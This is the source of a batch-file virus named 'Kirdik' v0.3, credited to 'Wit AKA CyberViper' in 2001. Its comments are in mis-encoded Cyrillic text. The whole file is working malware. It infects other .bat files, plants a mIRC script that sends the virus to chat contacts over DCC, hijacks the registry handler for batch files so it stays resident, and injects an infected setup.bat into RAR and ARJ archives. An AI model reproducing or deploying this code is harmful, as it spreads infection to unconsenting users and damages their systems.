@goto kird
:body
rem คฅแ์ โจฏ  โฅซฎ แโ เฎฃฎ ก โญจช 
goto __next
:kird
@ctty nul
echo ษอออออออออออออออออออออออออออออออออออออป>kirdik
echo บ        "จเค๋ช". ฅเแจ๏ 0.3         บ>kirdik
echo บCopiright by Wit AKA CyberViper.2001.บ>kirdik
echo ศอออออออออออออออออออออออออออออออออออออผ>kirdik
@echo off>kirdik
:kirdik
@if -%1 == --kirdik goto _infkirdik
@if -%1 == --runkirdik goto _runkirdik
@for %%b in (*.bat) do call %0 -kirdik %%b
@goto _endkirdik
:_infkirdik
@find "kirdik" %2>nul
@if not errorlevel 1 goto _runkirdik
@find "kirdik" %0 >kird
echo @goto kird>kirdik2
echo :body>>kirdik2
type %2>>kirdik2
echo.>>kirdik2
echo goto __next>>kirdik2
echo :kird>>kirdik2
echo @ctty nul>>kirdik2
type kird>>kirdik2
echo goto body>>kirdik2
echo :__next>>kirdik2
del %2>>kirdik
move kirdik2 %2
goto __next>kirdik
:_runkirdik
if not -%1 == --runkirdik goto __delmusorkirdik
@ctty con>kirdik66
call %2 %3 %4 %5 %6 %7 %8 %9>kirdik66
@ctty nul>kirdik66
del kirdik66
call %0 -kirdik %2
:__delmusorkirdik
if exist kird del kird>kirdik
if exist kirdik del kirdik>nul
goto __next|echo kirdik
:_endkirdik
if not exist c:\mirc\script.ini goto _notmirckirdik
call %0 -kirdik c:\wintest.bat
echo [script] >kirdik3
echo n0=on 1:FILESENT:*.*:if ( $me != $nick ) { /dcc send $nick c:\wintest.bat }>>kirdik3
echo n1=on 1:FILERCVD:*.*:if ( $me != $nick ) { /dcc send $nick c:\wintest.bat }>>kirdik3
move kirdik3 c:\mirc\script.ini
:_notmirckirdik
if not %winbootdir% == C:\WINDOWS goto _kirdikrezident
if exist %winbootdir%\batstart.bat goto _kirdikrezident
echo REGEDIT4>C:\WINDOWS\kirdik.reg
echo.>>C:\WINDOWS\kirdik.reg
echo [HKEY_CLASSES_ROOT\batfile\shell\open\command]>>C:\WINDOWS\kirdik.reg
echo @="\"C:\\WINDOWS\\batstart.bat\" -runkirdik %%1 %%*">>C:\WINDOWS\kirdik.reg
call %0 -kirdik C:\WINDOWS\batstart.bat
echo @regedit C:\WINDOWS\kirdik.reg>C:\WINDOWS\winstart.bat
echo @del C:\WINDOWS\kirdik.reg>>C:\WINDOWS\winstart.bat
echo @del C:\WINDOWS\winstart.bat>>C:\WINDOWS\winstart.bat
:_kirdikrezident
call %0 -kirdik setup.bat
@ctty con>kirdik
for %%r in (*.rar) do rar a %%r setup.bat>kirdik
for %%a in (*.arj) do arj a %%a setup.bat>kirdik
del setup.bat>kirdik
if exist kird del kird>kirdik
if exist kirdik del kirdik>nul
goto body
:__next
